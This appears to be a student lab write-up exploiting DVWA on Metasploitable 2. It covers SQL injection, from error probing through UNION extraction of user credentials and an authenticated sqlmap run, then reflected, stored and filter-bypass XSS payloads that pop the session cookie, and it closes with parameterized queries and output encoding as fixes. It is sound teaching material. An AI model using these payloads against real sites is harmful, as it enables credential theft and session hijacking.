# Week 3 — Web Vulnerability Validation

## Overview

This week moved from mapping inputs to actively exploiting them. Two core web vulnerabilities were covered: SQL Injection (SQLi) and Cross-Site Scripting (XSS). Both exist because of the same root cause — the server takes user input and uses it directly without sanitizing it.

Target: DVWA running on Metasploitable 2
Security Level: Low (unless stated otherwise)
Tools: OWASP ZAP, sqlmap, Firefox DevTools

---

## Part 1 — SQL Injection (SQLi)

### What is SQLi

A web application that talks to a database builds SQL queries using user input. If that input is not sanitized, an attacker can inject SQL commands instead of normal data — rewriting the logic of the query entirely.

Normal login query:
```sql
SELECT * FROM users WHERE username='admin' AND password='secret'
```

If the developer builds this query by directly concatenating user input:
```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

An attacker can break out of the string using a single quote `'` and inject their own SQL.

---

### Step 1 — Detecting the Vulnerability

**Endpoint tested:**
```
http://192.168.100.177/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

**Payload:**
```
1'
```

**What happened:** The database threw a syntax error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

**Why it worked:** The single quote broke out of the SQL string, causing a syntax error. The error revealed the database is MySQL and confirmed the input goes directly into a query unsanitized.

**This is Error-Based SQLi** — the database error itself leaks information.

---

### Step 2 — Database Fingerprinting

Before extracting data, the database type and version were identified manually.

**Payload:**
```
1' UNION SELECT version(), null#
```

**Why `null`:** UNION SELECT requires the same number of columns as the original query. The original query had 2 columns. `null` fills the second slot as a placeholder — it works with any data type.

**Result:** MySQL version returned directly on the page — confirming MySQL and revealing the exact version for known vulnerability research.

---

### Step 3 — Column Enumeration (ORDER BY)

Before UNION injection, the number of columns in the original SELECT statement must be known.

**Why:** UNION SELECT must return exactly the same number of columns as the original query. Too many or too few causes an error.

**Payloads tested:**
```
1' ORDER BY 1#    → success
1' ORDER BY 2#    → success
1' ORDER BY 3#    → error
```

**Result:** 2 columns confirmed. `ORDER BY` sorts results by column number — when the column doesn't exist, the database errors out. That error is the signal.

**Note:** `--` requires a space after it in MySQL to be recognized as a comment. `#` was used as an alternative comment character.

---

### Step 4 — Boolean-Based Injection

**Payload:**
```
1' OR '1'='1'#
```

**What happened:** All rows in the users table were returned.

**Why it worked:** `'1'='1'` is always true. The WHERE clause became always true — returning every user. The original query logic was completely rewritten.

**True vs False comparison:**
```
1' OR '1'='1'#   → all users returned (true)
1' OR '1'='2'#   → no users returned (false)
```

This page behavior difference is the basis of Boolean-Based SQLi — even without errors, an attacker can extract data by asking true/false questions and observing page responses.

---

### Step 5 — Table Enumeration via information_schema

`information_schema` is a built-in MySQL database that stores metadata about every database, table, and column on the server. It is the attacker's map.

**Payload:**
```
1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()#
```

**Breaking it down:**
- `information_schema.tables` — MySQL's internal list of all tables
- `table_schema=database()` — filter to only show tables in the current database (`dvwa`)
- `database()` — built-in MySQL function returning the current database name

**Result:** Table names returned on the page — revealing the `users` and `guestbook` tables.

---

### Step 6 — Column Enumeration

**Payload:**
```
1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'#
```

**Result:** All column names in the users table returned — revealing `user`, `password`, `first_name`, `last_name`, and others.

---

### Step 7 — Data Extraction (UNION-Based)

**Payload:**
```
1' UNION SELECT user, password FROM users#
```

**Result:** All usernames and password hashes dumped directly onto the page.

**Important distinction — Encryption vs Hashing:**

The passwords appeared as MD5 hashes, not plaintext. Hashing is not encryption:

| | Encryption | Hashing |
|---|---|---|
| Reversible | Yes (with key) | No |
| Purpose | Secure transmission | Verify without storing plaintext |
| Example | TLS, AES | MD5, bcrypt |

MD5 is a broken algorithm. The hashes were crackable instantly via rainbow tables (e.g. crackstation.net). This is still a critical finding — credentials extracted from a database can be reused across other services.

---

### Step 8 — Automation with sqlmap

sqlmap is a Python-based tool that automates the entire SQLi process — detection, fingerprinting, enumeration, and data extraction.

**Command used:**
```bash
sqlmap -u "http://192.168.100.177/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<value>;security=low" \
--dbs --threads=1 --level=1 --risk=1
```

**Why the cookie is needed:** DVWA requires an authenticated session. Without the cookie sqlmap hits the login page instead of the vulnerable endpoint.

**What sqlmap detected automatically:**
- Boolean-based blind injection
- Error-based injection
- Time-based blind injection
- UNION-based injection

**Additional intel revealed by sqlmap:**
- OS: Linux Ubuntu 8.04
- Web server: Apache 2.2.8
- PHP version: 5.2.4
- MySQL: >= 4.1

All of this is useful in a real engagement for identifying known CVEs against specific versions.

**Why DELETE via sqlmap failed:**
```
WARNING: execution of non-query SQL statements is only available when stacked queries are supported
```
MySQL on this target does not support stacked queries — multiple statements separated by `;` are blocked. This is a database configuration restriction, not a sqlmap limitation.

---

### SQLi Types Summary

| Type | How it works | Visibility |
|---|---|---|
| Error-based | Database errors leak info | Errors visible |
| Boolean-based | True/false page behavior | No errors needed |
| Union-based | Appends second SELECT | Data returned on page |
| Time-based | SLEEP() measures true/false | No output needed |

---

## Part 2 — Cross-Site Scripting (XSS)

### What is XSS

XSS occurs when a server takes user input and places it directly into an HTML page without encoding it. The browser cannot distinguish between legitimate HTML written by the developer and HTML injected by an attacker — it executes both.

Normal input:
```
You type:   Kausar
Page shows: <p>Hello Kausar</p>
```

Malicious input:
```
You type:   <script>alert(1)</script>
Page shows: <p>Hello <script>alert(1)</script></p>
```

The browser sees a script tag and executes it. The attacker's code runs in the victim's browser.

---

### Reflected XSS — Security Low

**Endpoint:**
```
http://192.168.100.177/dvwa/vulnerabilities/xss_r/
```

**Payload 1 — script tag:**
```javascript
<script>alert(document.cookie)</script>
```

**What happened:** A popup appeared displaying the session cookie.

**Why it worked:** The server reflected the input directly back into the HTML response without encoding. The browser executed the script tag.

**Why cookies matter:** The session cookie is the key to the user's session. Stealing it allows an attacker to log in as that user without knowing their password.

---

**Payload 2 — SVG with event handler:**
```javascript
<svg onload=alert(document.cookie)>
```

**What happened:** Same popup — cookie displayed.

**Why this matters:** Many filters block `<script>` specifically. SVG elements with event handlers achieve the same result through a different tag. This demonstrates that blocking a single tag is not sufficient defense.

---

### Stored XSS — Security Low

**Endpoint:** DVWA XSS (Stored) — guestbook page

**What makes stored XSS different:** The payload is saved to the database. Every user who visits the page triggers the script automatically — no malicious link required.

**Bypass:** The name field had a `maxlength=50` HTML attribute restricting input length. This is a client-side restriction only — bypassed by editing the attribute in browser DevTools (Inspect → find `maxlength` → change to `999`).

**Why this bypass works:** `maxlength` is enforced by the browser, not the server. The server accepts whatever length is submitted — the restriction exists only in the HTML.

**Payload 1 — script tag:**
```javascript
<script>alert(document.cookie)</script>
```

**Payload 2 — img tag with onerror:**
```javascript
<img src=x onerror=alert(document.cookie)>
```

**How `onerror` works:** The browser tries to load an image from `src=x`. That source doesn't exist — load fails. The `onerror` event fires, executing the JavaScript. No script tag needed.

**Result:** On every page reload the cookie popup triggered automatically — confirming the payload persisted in the database.

---

### Filter Bypass — Security Medium

**Security Medium** uses a weak filter that strips `<script>` once using a simple string replacement — but does not loop or apply recursively.

**Bypass payload:**
```javascript
<scr<script>ipt>alert(document.cookie)</script>
```

**Why it worked:** The filter found and removed `<script>` from inside the string — leaving behind `<script>` from the outer broken tag. After stripping the inner `<script>`, the remaining characters reassembled into a valid script tag.

Before filter: `<scr<script>ipt>`
After filter strips `<script>`: `<script>`

The reconstructed tag executed normally.

---

### Security High — Why Bypass Failed

**Security High** applies server-side HTML encoding to all output:

```
<  →  &lt;
>  →  &gt;
```

Raw server response:
```html
Hello &lt;script&gt;alert(1)&lt;/script&gt;
```

The browser renders `&lt;` as a less-than sign — not an HTML tag opener. No tag is ever formed. No script executes.

**Obfuscation attempts that failed:**
- Mixed case: `<sCrIpT>`
- Alternative tags: `<img onerror=...>`
- HTML entity encoding inside payload

All failed because the root cause — `<` being encoded at output — cannot be bypassed at the tag level. This is correct developer behavior. A consistently applied output encoding cannot be circumvented through payload manipulation.

**Real world lesson:** Obfuscation bypasses work against incomplete or inconsistent filters. Against proper output encoding they are ineffective — which is precisely why output encoding is the recommended defense.

---

## Mitigations

### SQLi Prevention

**Parameterized queries (prepared statements)** are the most effective defense:

```php
// Vulnerable
$query = "SELECT * FROM users WHERE id=" . $id;

// Safe
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

The query structure is defined first. User input is passed separately as a parameter — never concatenated into the SQL string. The database treats input as pure data, never as SQL commands. Injection is structurally impossible.

**Why input validation alone is insufficient:** Validation tries to predict and block malicious input. Attackers find encodings, edge cases, and character combinations that slip through. Parameterized queries don't need to predict anything — they separate code from data by design.

---

### XSS Prevention

**Output encoding** is the most effective defense. Every character that has special meaning in HTML is converted to its entity equivalent before being placed into the page:

```php
// Vulnerable
echo "Hello " . $_GET['name'];

// Safe
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

**Content Security Policy (CSP)** as a second layer — a response header that tells the browser which scripts are allowed to execute. Inline scripts can be blocked entirely.

**Why input validation alone is insufficient:** Input can be valid in one context and dangerous in another. A name like `O'Brien` is valid input but needs encoding before being placed in HTML. Validation that rejects it breaks functionality. Encoding handles it correctly without blocking legitimate input.

---

## Key Takeaways

- SQLi and XSS share the same root cause — unsanitized user input used directly by the server.
- A single quote `'` is the primary probe for SQLi. A less-than sign `<` is the primary probe for XSS.
- `information_schema` is MySQL's internal directory — it gives attackers a complete map of every database, table, and column without guessing.
- Hashed passwords extracted via SQLi are still a critical finding — MD5 is broken and cracks trivially.
- Stored XSS is more dangerous than Reflected because one injection affects every visitor permanently.
- Client-side restrictions (maxlength, disabled fields) are never security controls — they exist only in the browser and are trivially bypassed.
- Output encoding done consistently cannot be bypassed through payload obfuscation — it is the correct defense.
- Parameterized queries make SQLi structurally impossible — they are the correct defense.
